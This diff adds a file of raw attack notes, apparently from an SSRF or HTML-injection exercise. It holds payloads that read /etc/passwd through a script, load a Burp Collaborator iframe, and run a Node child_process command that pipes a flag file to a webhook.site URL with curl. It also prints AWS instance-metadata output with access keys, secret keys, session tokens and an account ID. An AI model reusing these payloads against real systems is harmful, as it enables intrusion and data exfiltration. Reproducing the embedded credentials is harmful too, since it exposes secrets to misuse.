@@ -1,0 +1,72 @@
+http://localhost:35673/etc/passwd
+
+<script>x = new XMLHttpRequest; x.onload = function () { document.write(this.responseText + document.location.pathname) }; x.open('GET', 'file:///etc/passwd'); x.send();</script>
+
+<iframe src="http://BURP-COLLABORATOR-URL"></iframe>
+
+---js
+((require("child_process")).execSync("cat ../../../../flag.txt | curl --data-binary @- https://webhook.site/01107aba-1530-48ce-b0f6-518bc107844d"))
+---
+
+{
+"Code" : "Success",
+"LastUpdated" : "2022-09-09T17:30:49Z",
+"Type" : "AWS-HMAC",
+"AccessKeyId" : "ASIAXOT35QYLSAMKCIPN",
+"SecretAccessKey" : "LYjUPfpAZ4G+Lw5mQWcTpCvaUTSGAcyatfcLsm2u",
+"Token" :
+"IQoJb3JpZ2luX2VjELL//////////wEaCXVzLXdlc3QtMiJGMEQCIB3PI9WG6S1VTyQYyd43HkwNtoRzVg+UlB5HboU7CLpUAiASizIAZ
+vPFf/qGB0PTbajDaFkQ6yLdMvN6dHlelmWKuyrMBAhLEAAaDDUxMjQzNDczNDYxNSIMTTqcjAUM+9uQb65pKqkE17539UplDbJkH1sSKHE
+r5L+rHf3Xm1Qk/87rO9wF5zDEhw/L8YDPqYMGq0erhx/Q/5jXApf0Y5Lx5uTLIHUWoyRA4hdfUDk53RpWKFhh++9Ev/iAbqWhhcldFtEhh
+g3S2j00l8oBtLfeGzyjEZWp+m0U0uRDmte9sL09RttOgifuYnq5YXQzveiK+RsQpk/qwNtRnvVNeGuHA+93jhJBtzQw+hhtf6z0iOTaaBy
+tDmY2UnQbDC8N+kwBwfNTbem8xbriBZuodOM9nL5kN2ujaiwsRFJRrVD+lUc98cCGfTDZdFll0R9HzmR8bBFCegHmc67Nm49TMckRr6IWs
+NmFynP9P9r72VArmxmJ3pc2CeX66qYz4Vce5ahmWYiF0DpM9c7H3UH9tQt/NRQgSTdZ1BrOYGZVkHsUU04TFUz/xMakajQwALtRxKiYUMY
+e0DXf2nWMNhr+NWOvrNVdajVAko8n8Whhj7WQ2o4OtXjU/v2uEN695EeBpwMujigxOSAz8fdbtuek15boHgNmfqzBKd8bYj5WS/nCDTBt0
+3TTjpVrhAtzIIuHOf0Yo7iHAiYKdcGLHq2DXADRH08F4fRMFJuvC2w1xpkBhIo9sUNAEpDpWuMDcSG0NMrSDyQg4IKgX8848o1GzqRrP8S
+53IBZ/XUFXkfFe+n43j0dP6x8LqMUXTxen2/iM69BJ/NezQ+EdfEQFSK/FFeZRM2JJSQ/hhnmDpytOkufrjC/8O2YBjqqAVvYyfsnTbDzB
+zTP8kFm17/HUGD/c1sxC8ZGHlJED/8V3auRWlqgMLCG+xxSYee5CY7ehwY9y5ImB6h5WZS+7aBqZR9p1izrahH/zP1xePfP5exYlkcb+OS
+Zl9LpLTy2gbcx/MDDz4RTD3wNLsDIxHS+Ikw+bP6EWaqQKlpyt09Q1vfefEVmef74IKufl5//LwBeBSQM5pueWgpqBMiRvY5rBWRfm9xh5
+iKg",
+"Expiration" : "2022-09-09T23:36:00Z"
+}
+
+
+
+----------http://169.254.169.254/latest/meta-data/iam/info
+{
+"Code" : "Success",
+"LastUpdated" : "2022-09-09T17:30:39Z",
+"InstanceProfileArn" : "arn:aws:iam::512434734615:instance-profile/AmazonSSMRoleForInstancesQuickSetup",
+"InstanceProfileId" : "AIPAXOT35QYLWBPDWDH2B"
+}
+
+----------http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+
+{
+"Code" : "Success",
+"LastUpdated" : "2022-09-09T17:30:38Z",
+"Type" : "AWS-HMAC",
+"AccessKeyId" : "ASIAXOT35QYLXQNOZMVC",
+"SecretAccessKey" : "fKBwweHpNf+OO0WLXRqJMQtHpNKSrBKDHWzgySkh",
+"Token" :
+"IQoJb3JpZ2luX2VjELL//////////wEaCXVzLXdlc3QtMiJGMEQCIH7rqwQRvTz3W2pGS+tJsVFpjOdGBkZvdJ4GpzW7FhdoAiBKuE7ve
+wT+puVd+U5EWc0obbvvbGEhZ5Tz8YRz0GAmoyqoBAhLEAAaDDUxMjQzNDczNDYxNSIMEagarzwA1rGploZ1KoUEyCjI0IVDgBR0wWzNLyW
+G1qucrN1GJiCc+t7twiSbPesxq+hrXQiu2NPCL4SNU4Zo+qu+Cui4a5DYgbaLE6KfWHo0Aswaor3WKrW2A5Xe1L4GP2zH3/Q5AQ87g+B6M
+11K7udRNabINQfkYWLWTbq/j4/kjSTGzBBmcqxGNajPtIWYbj/jqrJJDH7TirIWjNWe83IINRTDlS+4q4/4H6GyotGwdrMh1GJbZ95x9Bv
+Jsijd3d+HLnfrYNpBqD2dOlOya7Mqsl48nS1q2Q3U3VlUy2rs4PxL7Gi6QTbePjRZBBk7WxkEzzAGxua1+yslLjui4fTDM8h5JnKrj3tJ6
+8vbT6vR/uB8/3jgrgLOTX5M+D9wzLTRZJiu3NSlZbbDA7555uTx/DbUf6ODSoG0Vyn4cuPVeRcmgkhYO1G08tJ3vl+MBtStx73XFWjrEtL
+ygNlgUvyF6QgBt44ht50215xnWUJvN0/YPsKe4lFRejnhhSPUj5e035kI6l4AXFXNPtll25dcne95WH/Fv2NTmrTly9Q+10kV/f0I2/fOR
+MvuG0okwWIFcmrHuF93mu0EwTnIwpm+UmdGCd0B8F2mKH4XjEidpC+/yU8dKJiFIIZW9YjQLckafS+jycy1LR6tFAu/K7gEL89J6hr+PVt
+gQEcr5gBMRjIUzqaJKxSQg7aURw6gAt1ZzjC/8O2YBjqQAkqH7WX5F7fU8OsBWPpfGSEF3k1rUhQOGAyqCujdCoHy6Kgk+EsKTMKWrL51p
+eoRdAVxiT1herSlIzPjmuzRJuYUvPd28fwLElbZdcGQfO+GoSjAMgZppuCVHpfZTqcNtkK8Oo9IghID/SoeQHI6NFWw/1EshkWbeXuj9kM
+yRhGe8yltFh/sYPxGdTqsrnc+rUvpFat5N9yH5Ske20fxkaISjZk/nmU/KK/IJtFJHogcHdwGJ21d7sAeAZ+aIAP7U1cPrK6tlF5bDc0Mn
+A1UDQXwQ0Q6KxrVB9+KbZcKf4FWIqO2ckoIhUyHySlOrCRYrpTG/khZRwGfvsifazEtHYy41ZVNS7FHTtgmjrTmGzJU",
+"Expiration" : "2022-09-09T23:41:01Z"
+}
+
+----------
+{
+"Code" : "Success",
+"LastUpdated" : "2022-09-09T17:30:24Z",
+"AccountId" : "512434734615"
+}
